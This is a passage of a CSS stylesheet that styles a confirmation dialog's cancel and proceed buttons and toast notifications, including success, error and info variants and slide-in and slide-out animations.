      display: flex;
      gap: 10px;
      justify-content: flex-end;
    }
    
    .confirm-cancel {
      background: rgba(255,255,255,0.05);
      border: 1px solid var(--border);
      color: var(--text-secondary);
      border-radius: var(--radius-xs);
      padding: 7px 16px;
      font-family: var(--font);
      font-size: 12px;
      font-weight: 600;
      cursor: pointer;
      transition: all var(--transition);
    }
    
    .confirm-cancel:hover {
      background: rgba(255,255,255,0.09);
      color: var(--text-primary);
    }
    
    .confirm-proceed {
      background: rgba(239, 68, 68, 0.18);
      border: 1px solid rgba(239, 68, 68, 0.45);
      color: #fca5a5;
      border-radius: var(--radius-xs);
      padding: 7px 16px;
      font-family: var(--font);
      font-size: 12px;
      font-weight: 700;
      cursor: pointer;
      transition: all var(--transition);
    }
    
    .confirm-proceed:hover {
      background: rgba(239, 68, 68, 0.30);
      border-color: rgba(239, 68, 68, 0.7);
      color: #fecaca;
    }
    
    /* ═══════════════════════════════════════════════════════════
       TOAST NOTIFICATIONS
       ══════════════════════════════════════════════════════════ */
    #toast-container {
      position: fixed;
      bottom: 24px;
      right: 24px;
      z-index: 9100;
      display: flex;
      flex-direction: column;
      gap: 10px;
      pointer-events: none;
    }
    
    .toast {
      display: flex;
      align-items: flex-start;
      gap: 10px;
      background: var(--panel-bg);
      border: 1px solid var(--border);
      border-radius: var(--radius-sm);
      padding: 12px 16px;
      font-size: 12px;
      color: var(--text-secondary);
      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
      max-width: 340px;
      animation: toast-in 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
      pointer-events: auto;
    }
    
    .toast.toast-success {
      border-color: rgba(34, 211, 160, 0.4);
      background: rgba(34, 211, 160, 0.06);
    }
    
    .toast.toast-error {
      border-color: rgba(239, 68, 68, 0.4);
      background: rgba(239, 68, 68, 0.06);
    }
    
    .toast.toast-info {
      border-color: rgba(99, 102, 241, 0.4);
      background: rgba(99, 102, 241, 0.06);
    }
    
    .toast-icon {
      font-size: 14px;
      flex-shrink: 0;
      margin-top: 1px;
    }
    
    .toast-msg {
      flex: 1;
      line-height: 1.45;
    }
    
    .toast-msg strong {
      color: var(--text-primary);
      display: block;
      margin-bottom: 2px;
    }
    
    .toast-close {
      background: none;
      border: none;
      color: var(--text-muted);
      cursor: pointer;
      padding: 0;
      font-size: 14px;
      line-height: 1;
      flex-shrink: 0;
      margin-top: 1px;
    }
    
    .toast-close:hover {
      color: var(--text-primary);
    }
    
    .toast.toast-leaving {
      animation: toast-out 0.25s ease forwards;
    }
    
    @keyframes toast-in {
      from { opacity: 0; transform: translateX(40px); }
      to   { opacity: 1; transform: translateX(0); }
    }
    
    @keyframes toast-out {
      from { opacity: 1; transform: translateX(0); }
      to   { opacity: 0; transform: translateX(40px); }
    }
